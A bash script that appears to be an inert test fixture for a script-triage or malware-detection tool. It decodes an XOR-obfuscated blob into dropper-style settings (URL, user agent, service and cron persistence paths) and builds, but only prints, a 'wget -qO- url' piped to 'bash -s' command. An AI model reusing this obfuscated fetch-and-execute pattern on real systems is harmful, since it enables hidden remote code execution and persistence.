# configuration reconstruction
#!/usr/bin/env bash
# Huntress Script Triage -- inert static-analysis fixture (bash_linux)
readonly Material_f6018043='bcb99bb576bee1daba38abe7dbbc6cb8e1f5bb60a7ebdeac29aeedd9b964bee7c29675a3f4cfb564aee5dabd60b8b9ddae60bedbd9bd61a5f1de9675a3f4cfb576bee5cdac5aa9ebdfa771f7b5d6aa64a7f4cba062a4dbc3ad38a9e5c7b964a3e3c4e467acb0c9fb61acbc93f179bff6c6f46dbef0daba3fe5abc8af31a9b6ceaf3df3bc84ac7dabe9daa560e4edc4bf64a6edcee631a8b49ffd66f3e084ba6db6f1d9ac7795e5cdac6bbeb9e2bc6bbef6cfba7686e5c8e667acb0c9fb61acbc93f1'
readonly Codec_f6018043='hex_compact|repeating_key_xor|ca,84,aa,c9,05'

Load_f6018043() {
  e=()
  local raw="${Material_f6018043}" i
  for ((i=0; i<${#raw}; i+=2)); do e+=("$((16#${raw:i:2}))"); done
}

Decode_f6018043() {
  d=()
  local -a key_bytes=(202 132 170 201 5)
  local i
  for ((i=0; i<${#e[@]}; i++)); do
    d+=("$((e[i] ^ key_bytes[i % ${#key_bytes[@]}]))")
  done
}

Recover_f6018043() {
  local -a e d
  local t n z i
  local -a compass=(north south); n="$(IFS=:; printf '%s' "${compass[*]}")"
  Load_f6018043
  z=0; while ((z < 1)); do Decode_f6018043; ((z+=1)); done
  t=''
  local octal character
  for i in "${!d[@]}"; do
    printf -v octal '%03o' "${d[i]}"
    printf -v character '%b' "\\$octal"
    t+="$character"
  done
  printf '%s\n' "$t"
}

Inspect_f6018043() { Recover_f6018043; }

Plan_f6018043() {
  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
  descriptor="$(Inspect_f6018043)"
  local -a fields
  IFS='|' read -r -a fields <<< "$descriptor"
  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
  local -a request_command=(wget -qO- "$url")
  local -a interpreter=(bash -s)
  declare -p request_command interpreter
}

if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_f6018043; fi

# reconstruction complete